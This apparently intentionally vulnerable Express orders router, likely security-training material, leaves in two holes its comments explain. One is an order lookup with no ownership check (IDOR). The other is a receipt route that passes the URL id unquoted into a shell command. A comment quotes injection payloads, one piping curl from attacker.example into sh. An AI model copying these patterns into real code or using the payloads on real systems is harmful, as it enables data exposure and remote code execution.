import { Router } from "express";
import { exec } from "node:child_process";
import path from "node:path";
import fs from "node:fs";
import { db } from "../db";

export const ordersRouter = Router();

// Order lookup by id, with no check that the requesting session actually owns
// this order - any visitor can page through /api/orders/1, /api/orders/2, ...
// and read another customer's name, email and gift message (CWE-639 IDOR /
// broken object-level authorization).
ordersRouter.get("/:id", (req, res) => {
  const order = db.prepare("SELECT * FROM orders WHERE id = ?").get(req.params.id);
  if (!order) {
    res.status(404).json({ error: "Order not found" });
    return;
  }
  const items = db.prepare("SELECT name, quantity, price FROM order_items WHERE order_id = ?").all(req.params.id);
  res.json({ ...order, items });
});

const RECEIPTS_DIR = path.join(__dirname, "..", "..", "data", "receipts");
fs.mkdirSync(RECEIPTS_DIR, { recursive: true });
const RECEIPT_PATH = path.join(RECEIPTS_DIR, "latest-receipt.txt");

// Generates a plain-text receipt by shelling out, interpolating the :id route
// param directly and unquoted into the command string. Express doesn't
// coerce/validate this param - it's whatever string was in the URL - so a
// value like `1;touch /tmp/pwned #` (or `1;curl attacker.example|sh`) is
// executed verbatim by the shell, the `;` isn't inside any quoting that would
// neutralize it (CWE-78 OS command injection). Note this runs before any
// lookup of a matching order, so it doesn't matter whether :id resolves to a
// real order - the shell command always runs.
ordersRouter.get("/:id/receipt", (req, res) => {
  const id = req.params.id;
  const command = `echo Generating receipt for order ${id} > ${RECEIPT_PATH}`;

  exec(command, (err) => {
    if (err) {
      res.status(500).json({ error: "Failed to generate receipt" });
      return;
    }
    res.sendFile(RECEIPT_PATH);
  });
});
